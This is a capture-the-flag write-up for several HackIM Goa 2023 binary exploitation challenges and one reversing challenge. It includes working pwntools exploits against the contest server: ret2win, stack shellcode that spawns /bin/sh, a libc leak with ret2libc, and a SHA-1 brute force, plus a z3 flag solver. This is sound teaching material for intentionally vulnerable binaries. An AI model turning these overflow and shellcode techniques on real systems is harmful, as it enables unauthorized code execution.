# PWN CHALLENGES from HACKIM GOA23

## Heaven's Flow

<b>We are given a 64 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>

Here is the important part of the decompiled code of the main function where the bug is:- 

```c
  char local_218 [524];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to heaven!");
  puts("what would you like to do here:");
  printf(" 1. rest\n 2. have fun\n 3. relive a memory\n 4. get the flag\n>>");
  gets(local_218);
```



At  the very last line of the code snippet is they have used **gets** function which is vulnerable to buffer overflow because it doesn't have size parameter which limits the number of characters being read.

And there is a suspicious looking function in the binary :-**heavens secret**

```c
void heavens_secret(void)

{
  int iVar1;
  FILE *__stream;
  
  __stream = fopen("flag.txt","r");
  do {
    iVar1 = fgetc(__stream);
    putchar((int)(char)iVar1);
  } while ((char)iVar1 != -1);
  fclose(__stream);
  return;
}
```

This functions job is super simple . It opens the flag file and print out its content.



So it's basically a **ret2win** challenge where we have to overflow the buffer and tamper the return address with this function .

Let's first analyse the security mitigation's present in the binary  to decide on our approach for this challenge

| Mitigation   | Stance            |
| ------------ | ----------------- |
| RELRO        | Partial RELRO     |
| Stack Canary | No Canary Found   |
| NX           | NX Enabled        |
| PIE          | No PIE (0x400000) |

No serious mitigations present in this challenge . So we will proceed to the simple ret2win technique.

The buffer along with the padding and base pointer address will sum upto 536 characters after anything that will tamper the stored return address.

The exploit for the challenge is :-

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("./heaven_patched")
r = remote("52.59.124.14",10050)
exploit = b"A" * 536 + p64(e.sym.heavens_secret)
r.sendline(exploit)
r.interactive()
```



## Babypwn

<b>We are given a 64 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>



Here is the whole decompiled code of the main function in the program. Unlike the last challenge this program's main function is smaller but with pretty much same functionality.

```C
undefined8 main(void)

{
  undefined local_208 [512];
  
  setbuf(stdout,(char *)0x0);
  puts("You shell play a game against @gehaxelt! Win it to get ./flag.txt!");
  printf("Your game slot is at: %p\n",local_208);
  puts("What\'s your name?");
  read(1,local_208,0x400);
  printf("Ok, it\'s your turn, %s!\n",local_208);
  puts("You lost! Sorry :-(");
  return 0;
 }
```



The bug is pretty much straight forward we have read call which has the size parameter of 0x400 which is 1024 bytes but the size allocated for the buffer is only 512 . The overflow window is about 512 bytes more .

In the second printf statement it also prints out the address of the buffer where our input is stored which is basically a stack leak .

There are many ways where we can use this bug and the stack leak . But we need to check out the security mitigation's of the binary to decide on the best approach for the challenge.

| Mitigation   | Stance            |
| ------------ | ----------------- |
| RELRO        | Partial RELRO     |
| Stack Canary | No Canary Found   |
| PIE          | No PIE (0x400000) |
| NX           | NX disabled       |
| RWX          | Has RWX segments  |



There are literally zero mitigation's present in the binary. There are many ways in which we can solve the challenge.  

The RWX segment is the stack where our buffer is stored. So we can inject shellcode in the stack and return back to stack to execute the shellcode injected.

The shellcode we are going to use is:-

```assembly
BITS 64

mov rsp,0x404890
mov rax,0x3b
push 0
mov rbx,0x68732f2f6e69622f
push rbx
mov rdi,rsp
mov rsi, 0
mov rdx,0
syscall
```



The buffer size is 512 bytes and extra 8 more bytes for the base pointer address and any bytes after that tampers the stored returned address in the stack.

So let's place the shellcode first and then nopslide's are spammed until it reaches the stored return address and place the leaked address as the return address.

```python
#!/usr/bin/env python3


from pwn import *

#r = process("./babypwn_patched")
r = remote("52.59.124.14",10020)
f = open("./shell","rb")
shellcode = f.read()
f.close()
r.recvuntil(b"Your game slot is at: ")
leak = int(r.recvline().strip(),16)
exploit = shellcode + p8(0x90) * 482  + p64(leak)
r.sendline(exploit)
r.interactive()
```

## Juniorpwn

<b>We are given a 64 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>

Here is the whole decompiled code of the main function in the program. 

```c
undefined8 main(void)

{
  undefined local_208 [512];
  
  setbuf(stdout,(char *)0x0);
  puts("You shell play a game against @gehaxelt (again)! Win it to get ./flag.txt!");
  puts("What\'s your name?");
  read(1,local_208,0x400);
  printf("Ok, it\'s your turn, %s!\n",local_208);
  puts("You lost! Sorry :-(");
  return 0;
}
```

There is the same Buffer Overflow vulnerability like the last challenge with the same size of the buffer too. But here the printf statement gives us a leak. But this leak isn't as easy as the stack leak from the previous challenge .

```
[+] Opening connection to 52.59.124.14 on port 10034: Done
[*] Switching to interactive mode
You shell play a game against @gehaxelt (again)! Win it to get ./flag.txt!
What's your name?
Ok, it's your turn, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc3\xa7\xeb\xbe!

```

I gave 520 A's to overflow the buffer .Here we can see that there are extra contents printed out with our A's . That is the leak I have been mentioning about.

The input is taken from read which basically has no input delimiters . And printf basically prints out everything until it encounters a null byte.

Let's first check the security mitigation's of the binary to come up with the plan.

| Mitigation   | Stance            |
| ------------ | ----------------- |
| RELRO        | Partial RELRO     |
| Stack Canary | No Canary Found   |
| NX           | NX Enabled        |
| PIE          | No PIE (0x3ff000) |

There are no serious mitigations present in the binary . 

Our technique is to make use of the read function no use of delimiter with printf that leaks everything until a null byte is encountered to leak libc address present in the stack .

And also return back to main using a partial overwrite in the return address .And then simple use of ret2libc to solve the challenge.

```python
#!/usr/bin/env python3


from pwn import * 

e = ELF("./juniorpwn")
libc  = ELF("./libc.so.6")
#r = process("./juniorpwn")
r = remote("52.59.124.14",10034)
exploit = b"A" * 520 + p8(0xc3)
r.send(exploit)
r.recvuntil(b"A" * 520)
leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - 0x271c3
print(hex(leak))
exploit = b"A" * 520 + p64(leak + 0x0000000000027765) + p64(leak + next(libc.search(b"/bin/sh\x00"))) + p64(leak + 0x28f19) + p64(0) + p64(leak + 0xfdcdd) + p64(0) + p64(leak + libc.sym.execve)
r.send(exploit)
r.interactive()


```



## Hack the Hash

<b>We are given a 32 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>

To be honest, with all those dependencies and being the only 32 bit than other and also provided libc was broken . So it was hard time setting up the challenge.

And  my crypto skills are not like my pwn skills . So this challenge was kinda tougher for me than the others.

```C
undefined4 main(void)

{
  int iVar1;
  char local_194 [128];
  undefined local_114 [128];
  undefined local_94 [128];
  FILE *local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  memset(local_94,0,0x80);
  memset(local_114,0,0x80);
  puts("Someone blocked @gehaxelt from logging in to this super secure system!");
  puts("But somehow, he still manages to get in... how?!?!");
  printf("Username: ");
  read(1,local_94,0x80);
  printf("Password: ");
  read(1,local_114,0x80);
  iVar1 = FUN_00011329(local_94,local_114);
  if (iVar1 == 0) {
    puts("Access denied!");
  }
  else {
    local_14 = fopen("flag.txt","r");
    fgets(local_194,0x80,local_14);
    fclose(local_14);
    puts("Access granted!");
    printf("Flag: %s\n",local_194);
  }
  return 0;
}
```

The main function is simple it asks for username and password . And pass it to a function if the username and password is correct it will give you the flag.

Note the input is read safely on both username and password . So there is no easy buffer overflow like the previous challs.

```C
bool FUN_00011329(char *param_1,undefined4 param_2)

{
  size_t sVar1;
  int iVar2;
  undefined local_22 [18];
  int local_10;
  
  memset(local_22,0,0x12);
  local_10 = 0x1337;
  FUN_0001123d(param_2,local_22);
  sVar1 = strlen(param_1);
  iVar2 = strncmp(param_1,"gehaxelt",sVar1 - 1);
  if (iVar2 == 0) {
    puts("Gehaxelt is not allowed to authenticate!");
  }
  else {
    iVar2 = FUN_0001128a("9784b18945d230d853e9a999921dcb2656a291ce",local_22);
    if (iVar2 != 0) {
      local_10 = 0;
    }
  }
  return local_10 == 0;
}

```



```c
void FUN_0001123d(uchar *param_1,uchar *param_2)

{
  size_t sVar1;
  
  memset(param_2,0,4);
  sVar1 = strlen((char *)param_1);
  SHA1(param_1,sVar1 - 1,param_2);
  return;
}
```



```c
bool FUN_0001128a(char *param_1,int param_2)

{
  size_t sVar1;
  int iVar2;
  char local_39 [41];
  int local_10;
  
  memset(local_39,0,0x29);
  for (local_10 = 0; local_10 < 0x14; local_10 = local_10 + 1) {
    sprintf(local_39 + local_10 * 2,"%02x",(uint)*(byte *)(param_2 + local_10));
  }
  sVar1 = strlen(param_1);
  iVar2 = strncmp(param_1,local_39,sVar1 - 1);
  return iVar2 == 0;
}
```



Few things to note here:-

1. The  return value of the function is a boolean which should be set true to get the flag.

2. The local 10 int variable which value is set to 0x1337 should be set to 0 to get the flag.

3. The statement which changes the value to 0 is the if statement in the else part .

4. So the username should not be gexahelt to execute the else part.

5. The first function of the 2 sub functions is responsible for creating the SHA-1 hash for the password

6. The second function is reponsible whether the hash present in the function parameter of the programmer is equal to the hash created from our password.

   

At the beginning I had no hope and tried running my hashcat on that hash to get the password . Until I noticed something,I placed a watchpoint on the int variable because when I was single stepping the program. The value that compared with 0 at the function ending wasn't 0x1337.

The values change every time when I change the password input for the program.

So I went on to find where the value is been coming from,After some time it was found to be the last 2 bytes of the hash values from the password.

So I don't need to crack the hash anyways, I just need to find a password such that the last 2 bytes of the SHA-1 hash is equal to 0000 . That's it.

The Exploit script for the challenge is:-



```python
#!/usr/bin/env python3


from pwn import *
import hashlib

r = remote("52.59.124.14",10100)
hashed = "9784b18945d230d853e9a999921dcb2656a291ce"
flag = 1
for i in range(1,256):
    if(flag == 0):
        break
    for j in range(1,256):
        if(flag == 0):
            break
        for k in range(1,256):
            val = chr(i).encode() + chr(j).encode() + chr(k).encode()
            hasher = hashlib.sha1(val).hexdigest()
            if(hasher[-4:] == "0000"):
                flag = 0
                break
r.sendline(val)
r.sendline(val)
r.interactive()

```



# Reverse challenge from HACKIM GOA 23

## Movie

<b>We are given a 64 bit statically linked binary  with 7 user defined functions</b>

The 7 user defined functions are:-

1) main
2) crc32b
3) check
4) ccheck
5) cccheck
6) ccccheck
7) cccccheck

#### Main function

It calls all the check functions on user input and prints "Nice,you're are right"  if the flag is correct or crashes the program by writing to a null pointer if any of the checks fail

#### Check function

It is a simple function that checks whether the user input starts with **ENO{** .

#### Ccheck function

This function does some Xor options with a hardcoded string "R]WL^aA|q#g" and checks whether the input index from 12 -  22 is **AND_MrRob0t**

#### Cccheck function

1.Checks whether the flag index from 4-11 is only A-Z,0-9 ,\, and _.

2.Modifies the flag index from 4-11 by xoring it with already founded index from 15-22.

3.Xors the modified flag index from 4-11 with already founded values of flag index from 15-22 and checks whether it sums is equal to 500.

4.Xors the modified flag index from 4-11 with already founded values of flag index from 15-22 and checks whether it product is equal to 0x3A49D503C4C0.

#### Ccccheck function

Just checks whether the last character of user input is **}**

#### Cccccheck function

Calls the crc32b function with our modified user input and checks whether the return value is equal to 1729247814.

#### crc32b function

I didn't reverse crc32b function well and solved it without knowing about this function as this function was complicated.

```python
#!/usr/bin/env python3


from z3 import *
import string

a1 = [BitVec(f"flag_{i}",32)for i in range(24)]
s = Solver()
s.add(a1[0] == ord("E"))
s.add(a1[1] == ord("N"))
s.add(a1[2] == ord("O"))
s.add(a1[3] == ord("{"))
s.add(a1[23] == ord("}"))
s.add(a1[12] == ord("A"))
s.add(a1[13] == ord("N"))
s.add(a1[14] == ord("D"))
s.add(a1[15] == ord("_"))
s.add(a1[16] == ord("M"))
s.add(a1[17] == ord("r"))
s.add(a1[18] == ord("R"))
s.add(a1[19] == ord("o"))
s.add(a1[20] == ord("b"))
s.add(a1[21] == ord("0"))
s.add(a1[22] == ord("t"))
s.add(a1[23] == ord("}"))
s.add(a1[11] == ord("_"))
s.add(a1[4] == ord("H"))
sum_val = 0
mul_val = 1
ccheck = "ENO{*******_AND_MrRob0t}"
for i in range(4,12):
    sum_val+=a1[i] ^ ord(ccheck[11+i])
    mul_val*=a1[i] ^ ord(ccheck[11+i])
s.add(sum_val == 500)
s.add(mul_val == 0x3a49d503c4c0)
val = string.digits + string.ascii_uppercase
for i in range(5,11):
    for j in range(0,127):
        if(chr(j)  not in val):
            s.add(a1[i] != j)
for i in range(5,11):
    s.add(a1[i] >= 0x30)
    s.add(a1[i] <= 0x5a)
for i in range(1,10):
    print(s.check())
    model = s.model() 
    flag = ''.join([chr(int(str(model[a1[i]]))) for i in range(len(model))])
    print(flag)
```



As the crc32 function was kinda tough I made some guesses and got a list of hacker movies and series that is of seven letters.

From guessing I found before and after AND '_'  should be there.

Only Hackers was the one, So I gave H as part of the one of the constraints . Even before that constraints part most of the possible flags without crc constraints turn out to have 'H' in flag index 4. After adding the constraints I got the flags inside 10 possibilities.

